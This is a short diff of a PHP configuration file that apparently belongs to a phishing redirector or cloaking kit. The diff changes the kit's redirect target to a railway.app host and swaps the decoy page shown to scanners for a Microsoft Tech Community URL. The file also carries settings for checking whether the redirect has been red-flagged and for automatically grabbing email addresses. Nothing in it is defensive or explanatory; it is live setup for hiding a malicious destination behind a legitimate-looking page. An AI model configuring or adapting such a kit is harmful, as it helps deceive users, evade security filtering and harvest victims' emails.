@@ -11,7 +11,7 @@
 
 $license_key = "gzd7ig7t0mny0d01grbtpw7xdqx5c6vv"; // [REQUIRED]
 
-$redirect = "https://191b779-c696-4429-8973-21acacd3457p-production-0942.up.railway.app"; // URL or FILE [REQUIRED]
+$redirect = "https://mmfr.up.railway.app"; // URL or FILE [REQUIRED]
 
 
 $parameter = 1; // [REQUIRED]
@@ -32,7 +32,7 @@ $check_red_page = false; // Check The Redirect If Red Flag
 $authentification = false; // Not necessary
 
 $cloaker = [
-    "url_to_grab" => "https://lawhive.co.uk/litigation/", // Change the link you want to grap it in your link ( if t)
+    "url_to_grab" => "https://techcommunity.microsoft.com/category/Microsoft-Viva", // Change the link you want to grap it in your link ( if t)
 ];
 
 $auto_grabber = false; // Activate Auto Grab Email
